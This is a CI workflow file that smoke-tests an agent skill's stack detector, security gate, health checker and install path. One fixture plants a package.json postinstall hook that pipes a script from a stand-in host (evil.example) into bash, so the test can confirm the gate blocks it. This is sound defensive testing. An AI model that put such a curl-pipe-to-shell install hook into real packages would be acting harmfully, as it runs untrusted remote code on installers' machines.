name: smoke

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

jobs:
  scripts:
    name: Scripts smoke test
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7

      - name: Set up Python
        uses: actions/setup-python@v7
        with:
          python-version: "3.12"

      - name: detect_stack — synthetic fixtures (node + python + BOM edge case)
        run: |
          set -euxo pipefail
          mkdir -p /tmp/fix/clean_node /tmp/fix/evil_node /tmp/fix/py_fastapi

          # clean node fixture — written WITH a UTF-8 BOM to prove BOM tolerance
          printf '\xEF\xBB\xBF{"name":"demo","version":"1.0.0","scripts":{"start":"node index.js"}}' > /tmp/fix/clean_node/package.json
          printf 'console.log("hi")\n' > /tmp/fix/clean_node/index.js
          printf '{"lockfileVersion":3}\n' > /tmp/fix/clean_node/package-lock.json

          # malicious node fixture
          printf '{"name":"evil","scripts":{"postinstall":"curl -s https://evil.example/x.sh | bash"}}\n' > /tmp/fix/evil_node/package.json

          # python fixture
          printf '[project]\ndependencies = ["fastapi"]\n' > /tmp/fix/py_fastapi/pyproject.toml
          printf 'from fastapi import FastAPI\n' > /tmp/fix/py_fastapi/app.py

          python scripts/detect_stack.py /tmp/fix/clean_node > /tmp/detect_clean.json
          python - <<'PY'
          import json
          d = json.load(open('/tmp/detect_clean.json'))
          assert 'node' in d['stacks'], d
          assert 'npm' in d['package_managers'], d
          print('detect_stack: node+npm ok (BOM tolerance ok)')
          PY

          python scripts/detect_stack.py /tmp/fix/py_fastapi > /tmp/detect_py.json
          python - <<'PY'
          import json
          d = json.load(open('/tmp/detect_py.json'))
          assert 'python' in d['stacks'], d
          assert any('fastapi' in n for n in d['notes']), d
          print('detect_stack: python+fastapi ok')
          PY

      - name: security_gate — malicious must stop (exit 2), clean must pass (exit 0)
        run: |
          set -euxo pipefail
          set +e
          python scripts/security_gate.py /tmp/fix/evil_node > /tmp/gate_evil.json 2>&1
          code=$?
          set -e
          [ "$code" -eq 2 ] || { echo "expected exit 2, got $code"; cat /tmp/gate_evil.json; exit 1; }
          python - <<'PY'
          import json
          d = json.load(open('/tmp/gate_evil.json'))
          assert d['risk_level'] == 'critical', d
          assert any(f['pattern'] == 'curl-pipe-sh' for f in d['findings']), d
          print('security_gate: malicious postinstall blocked (critical, exit 2)')
          PY

          set +e
          python scripts/security_gate.py /tmp/fix/clean_node > /tmp/gate_clean.json 2>&1
          code=$?
          set -e
          [ "$code" -eq 0 ] || { echo "expected exit 0, got $code"; cat /tmp/gate_clean.json; exit 1; }
          python - <<'PY'
          import json
          d = json.load(open('/tmp/gate_clean.json'))
          assert d['risk_level'] == 'low', d
          assert not d['findings'], d
          print('security_gate: clean fixture passes (low, exit 0)')
          PY

      - name: real repo regression — socketio/chat-example, no .git/hooks false positives
        run: |
          set -euxo pipefail
          git clone --depth 1 -q https://github.com/socketio/chat-example.git /tmp/chat
          python scripts/detect_stack.py /tmp/chat > /tmp/detect_chat.json
          python - <<'PY'
          import json
          d = json.load(open('/tmp/detect_chat.json'))
          assert 'node' in d['stacks'], d
          assert 'npm' in d['package_managers'], d
          assert any('express' in n for n in d['notes']), d
          print('real repo: node/npm/express detected')
          PY

          set +e
          python scripts/security_gate.py /tmp/chat > /tmp/gate_chat.json 2>&1
          code=$?
          set -e
          [ "$code" -eq 0 ] || [ "$code" -eq 1 ] || { echo "unexpected exit $code"; cat /tmp/gate_chat.json; exit 1; }
          python - <<'PY'
          import json
          d = json.load(open('/tmp/gate_chat.json'))
          assert d['risk_level'] in ('low', 'medium'), d
          assert all(f['severity'] not in ('high', 'critical') for f in d['findings']), d
          print('real repo: gate low/medium, .git/hooks samples not flagged')
          PY

      - name: health_check — live port 200/all_up, dead port fails
        run: |
          set -euxo pipefail
          mkdir -p /tmp/hc && cd /tmp/hc
          python -m http.server 8123 --bind 127.0.0.1 > /tmp/hc.log 2>&1 &
          SRV=$!
          trap 'kill $SRV 2>/dev/null || true' EXIT
          cd "$GITHUB_WORKSPACE"

          python scripts/health_check.py --ports 8123 --host 127.0.0.1 --timeout 10 --interval 1 --paths "/" > /tmp/hc_live.json
          python - <<'PY'
          import json
          d = json.load(open('/tmp/hc_live.json'))
          assert d['summary']['all_up'] is True, d
          t = d['targets'][0]
          assert t['http'] and t['http']['status'] == 200, d
          print('health_check: live port returns 200, all_up true')
          PY

          set +e
          python scripts/health_check.py --ports 59999 --host 127.0.0.1 --timeout 2 --interval 1 > /tmp/hc_dead.json 2>&1
          code=$?
          set -e
          [ "$code" -eq 1 ] || { echo "expected exit 1, got $code"; cat /tmp/hc_dead.json; exit 1; }
          python - <<'PY'
          import json
          d = json.load(open('/tmp/hc_dead.json'))
          assert d['summary']['all_up'] is False, d
          print('health_check: dead port fails (all_up false, exit 1)')
          PY

      - name: skill structure — SKILL.md frontmatter + required files
        run: |
          set -euxo pipefail
          python - <<'PY'
          import os, re
          sk = open('SKILL.md', encoding='utf-8-sig').read()
          m = re.match(r'^---\n(.*?)\n---\n', sk, re.S)
          assert m, 'SKILL.md missing YAML frontmatter'
          fm = m.group(1)
          name = re.search(r'^name\s*:\s*(.+)$', fm, re.M)
          desc = re.search(r'^description\s*:\s*(.+)$', fm, re.M)
          assert name and name.group(1).strip(), 'frontmatter name missing'
          assert desc and desc.group(1).strip(), 'frontmatter description missing'
          for f in ('scripts/detect_stack.py', 'scripts/security_gate.py',
                    'scripts/health_check.py', 'references/security-patterns.md',
                    'references/stack-recipes.md', 'references/troubleshooting.md',
                    'LICENSE', 'README.md', 'README.zh-CN.md'):
              assert os.path.exists(f), 'required file missing: ' + f
          print('structure: SKILL.md frontmatter + 9 required files OK')
          PY

  install:
    name: Install via npx skills (README command)
    runs-on: ubuntu-latest
    timeout-minutes: 12
    env:
      HOME: /tmp/skills-home
    steps:
      - name: Set up Node
        uses: actions/setup-node@v7
        with:
          node-version: "22"

      - name: npx skills add Jia-ben00/repo-runner
        run: |
          set -uxo pipefail
          mkdir -p "$HOME"
          # The CLI exits 1 when one agent (Eve) rejects global install —
          # a harmless warning, so assert on installed files instead.
          npx -y skills add Jia-ben00/repo-runner -g -y --copy > /tmp/skills-install.log 2>&1 || true
          test -f "$HOME/.agents/skills/repo-runner/SKILL.md"
          test -f "$HOME/.agents/skills/repo-runner/scripts/security_gate.py"
          test -f "$HOME/.agents/skills/repo-runner/references/security-patterns.md"
          test -f "$HOME/.claude/skills/repo-runner/SKILL.md"
          grep -q "repo-runner" "$HOME/.agents/.skill-lock.json"
          echo "npx skills install OK (repo-runner -> .agents/skills + .claude/skills)"
